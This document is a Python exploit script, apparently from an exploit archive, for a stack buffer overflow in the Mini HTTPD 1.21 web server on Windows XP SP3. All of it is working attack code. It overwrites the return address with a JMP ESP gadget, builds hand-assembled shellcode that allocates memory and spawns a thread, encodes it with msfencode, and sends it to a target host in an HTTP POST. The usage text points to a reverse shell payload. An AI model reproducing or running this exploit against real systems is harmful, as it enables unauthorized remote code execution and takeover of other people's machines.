#!/usr/bin/python
#
# Title: Mini HTTPD stack buffer overflow POST exploit
# Author: TheColonial
# Date: 20 Feb 2013
# Software Link: http://www.vector.co.jp/soft/winnt/net/se275154.html
# Vendor Homepage: http://www.picolix.jp/
# Version: 1.21
# Tested on: Windows XP Professional SP3
#
# Description:
# This is a slightly more weaponised version of the Mini HTTPD buffer overflow
# written by Sumit, located here: http://www.exploit-db.com/exploits/31736/
# I wrote this up because the existing version had a hard-coded payload and
# didn\'t work on any of my XP boxes.
#
# The instability of the existing is down to bad chars, and the parent thread
# killing off the child thread when the thing is still running. This exploit
# allocates memory in a safe area, copies the payload to it, creates a new
# thread which runs the payload and then suspends the current thread. The
# suspending of the thread forces the parent to kill it off rather than let
# it crash and potentially bring the process down.
#
# Run the script without arguments to see usage.

import struct, socket, sys, subprocess

# Helper function that reads the body of files off disk.
def file_content(path):
  with open(path, \'rb\') as f:
    return f.read()

# Sent the payload in the correct format to the target host/port.
def pwn(host, port, payload):
  print \"[*] Connecting to {0}:{1}...\".format(host, port)
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  print \"[*] Connected, sending payload {0} bytes...\".format(len(payload))
  payload = \"POST /{0} HTTP/1.1\\r\\nHost: {1}\\r\\n\\r\\n\".format(payload, host)
  s.send(payload)
  s.shutdown
  s.close
  print \"[+] Payload of {0} bytes sent, hopefully your shellcode executed.\".format(len(payload))

# Create the part of the payload creates a thread to run the final payload in.
def create_payload_thread(final_payload_size):
  VirtualAlloc = struct.pack(\"<L\", 0x7c809AE1)   # in kernel32
  CreateThread = struct.pack(\"<L\", 0x7c8106c7)   # in kernel32
  SuspendThread = struct.pack(\"<L\", 0x7c83974A)  # in kernel32

  payload  = \"\"
  payload += \"\\x83\\xec\\x02\"   # add esp, 0x2 (aligns the stack)
  payload += \"\\x89\\xe6\"       # mov esi, esp
  payload += \"\\x83\\xc6\\x00\"   # add esi, <some offset filled later>
  count_offset = len(payload) - 1

  # zero out ebx because we use zero a lot
  payload += \"\\x31\\xdb\"             # xor ebx,ebx

  # allocate some memory to store our shellcode in which is
  # away from the current active area and somewhere safe
  payload += \"\\x6a\\x40\"             # push 0x40
  payload += \"\\x68\\x00\\x30\\x00\\x00\" # push 0x3000
  payload += \"\\x68\\x00\\x10\\x00\\x00\" # push 0x1000
  payload += \"\\x53\"                 # push ebx
  payload += \"\\xB8\" + VirtualAlloc  # mov eax,<address>
  payload += \"\\xff\\xd0\"             # call eax

  # copy the payload over to the newly allocated area
  size_bin = struct.pack(\"<L\", final_payload_size + 4)
  payload += \"\\xb9\" + size_bin      # mov ecx,final_payload_size
  payload += \"\\x89\\xc7\"             # mov edi,eax
  payload += \"\\xf2\\xa4\"             # rep movsb

  # create the thread with a starting address pointing to the
  # allocated area of memory
  payload += \"\\x53\"                 # push ebx
  payload += \"\\x53\"                 # push ebx
  payload += \"\\x53\"                 # push ebx
  payload += \"\\x50\"                 # push eax
  payload += \"\\x53\"                 # push ebx
  payload += \"\\x53\"                 # push ebx
  payload += \"\\xB8\" + CreateThread  # mov eax,<address>
  payload += \"\\xff\\xd0\"             # call eax

  # We call SuspendThread on the current thread, because this
  # forces the parent to kill it. The bonus here is that doing
  # so prevents the thread from dying and bringing the whole
  # process down.
  payload += \"\\x4b\"                 # dec ebx
  payload += \"\\x4b\"                 # dec ebx
  payload += \"\\x53\"                 # push ebx
  payload += \"\\xB8\" + SuspendThread # mov eax,<address>
  payload += \"\\xff\\xd0\"             # call eax
  payload += \"\\x90\" * 4

  # fill in the correct offset so that we point ESI to the
  # right location at the start of the final payload
  size = len(payload) + final_payload_size % 4

  print \"[*] Final stage is {0} bytes.\".format(final_payload_size)

  offset = struct.pack(\"B\", size)

  # write the value to the payload at the right location and return
  return payload[0:count_offset] + offset + payload[count_offset+1:len(payload)]

# Creates the first stage of the exploit which overwrite EIP to get control.
def create_stage1():
  eip_offset = 5412
  jmp_esp = struct.pack(\"<L\", 0x7e4456F7) # JMP ESP in advapi32

  eip_offset2 = eip_offset + 4

  payload  = \"\"
  payload += \"A\" * eip_offset    # padding to reach EIP overwrite
  payload += jmp_esp             # address to overwrite IP with
  payload += \"\\x90\"              # alignment
  payload += \"\\x83\\xEC\\x21\"      # rejig ESP
  return payload

# Create encoded shellcode from the given payload.
def create_encoded_shellcode(payload):
  print \"[*] Input payload of {0} bytes received. Encoding...\".format(len(payload))
  params = [\'msfencode\', \'-e\', \'x86/opt_sub\', \'-t\', \'raw\',
      \'BufferRegister=ESP\', \'BufferOffset=42\', \'ValidCharSet=filepath\']
  encode = subprocess.Popen(params, stdout = subprocess.PIPE, stdin = subprocess.PIPE)
  shellcode, _ = encode.communicate(payload)
  print \"[*] Shellcode of {0} bytes generated.\".format(len(shellcode))
  return shellcode

print \"\"
print \"MiniHTTPd 1.21 exploit for WinXP SP3 - by TheColonial\"
print \"-----------------------------------------------------\"
print \"\"
print \" Note: msfencode must be in the path and Metasploit must be up to date.\"

if len(sys.argv) != 4:
  print \"\"
  print \" Usage: {0} <host> <port> <payloadfile>\".format(sys.argv[0])
  print \"\"
  print \"          host : IP/name of the target host.\"
  print \"          port : Port that the target is running on.\"
  print \"   payloadfile : A file with the raw payload that is to be run.\"
  print \"                 This should be the raw, non-encoded output of\"
  print \"                 a call to msfpayload\"
  print \"\"
  print \"   eg. {0} 192.168.1.1 80 reverse_shell_raw.bin\"
  print \"\"
else:
  print \"\"
  print \"   Make sure you have your listeners running!\"
  print \"\"

  host = sys.argv[1]
  port = int(sys.argv[2])
  payload_file = sys.argv[3]
  stage1 = create_stage1()
  final_stage = file_content(payload_file)
  thread_payload = create_payload_thread(len(final_stage))
  shellcode = create_encoded_shellcode(thread_payload + final_stage)
  padding = \"A\" * 0x10
  pwn(host, port, stage1 + shellcode + padding)

